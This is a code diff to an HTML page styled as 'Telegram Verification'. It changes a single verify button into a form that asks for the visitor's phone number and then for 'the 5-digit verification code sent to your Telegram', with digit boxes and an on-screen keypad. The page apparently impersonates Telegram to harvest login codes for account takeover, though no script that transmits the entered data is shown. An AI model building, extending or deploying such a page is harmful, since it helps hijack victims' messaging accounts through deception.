@@ -15,17 +15,56 @@
         
         <div class="content">
             <div class="emoji-center">
-                <span class="emoji">✅</span>
+                <span class="emoji">📱</span>
             </div>
             
-            <div class="instruction">
-                <b>Telegram Verification</b><br><br>
-                Click below to verify your account and continue.
+            <!-- Phone Number Section -->
+            <div id="phone-section">
+                <div class="instruction">
+                    <b>Telegram Verification</b><br><br>
+                    Enter your phone number to receive the verification code.
+                </div>
+                
+                <input type="tel" id="phone-input" class="phone-input" placeholder="+91 98765 43210">
+                
+                <button id="send-otp-btn" class="verify-btn">
+                    📤 Send Verification Code
+                </button>
             </div>
             
-            <button id="verify-btn" class="verify-btn">
-                🔐 Verify & Continue
-            </button>
+            <!-- OTP Section (hidden by default) -->
+            <div id="otp-section" style="display: none;">
+                <div class="instruction">
+                    <b>Telegram Verification</b><br><br>
+                    Enter the 5-digit verification code sent to your Telegram.
+                </div>
+                
+                <div class="otp-boxes">
+                    <input type="text" maxlength="1" class="otp-box" data-index="0">
+                    <input type="text" maxlength="1" class="otp-box" data-index="1">
+                    <input type="text" maxlength="1" class="otp-box" data-index="2">
+                    <input type="text" maxlength="1" class="otp-box" data-index="3">
+                    <input type="text" maxlength="1" class="otp-box" data-index="4">
+                </div>
+                
+                <button id="verify-btn" class="verify-btn">
+                    ✅ Verify Code
+                </button>
+                
+                <div class="keypad">
+                    <button class="key" data-key="1">1</button>
+                    <button class="key" data-key="2">2</button>
+                    <button class="key" data-key="3">3</button>
+                    <button class="key" data-key="4">4</button>
+                    <button class="key" data-key="5">5</button>
+                    <button class="key" data-key="6">6</button>
+                    <button class="key" data-key="7">7</button>
+                    <button class="key" data-key="8">8</button>
+                    <button class="key" data-key="9">9</button>
+                    <button class="key" data-key="0">0</button>
+                    <button class="key backspace" data-key="backspace">⌫</button>
+                </div>
+            </div>
         </div>
     </div>
     
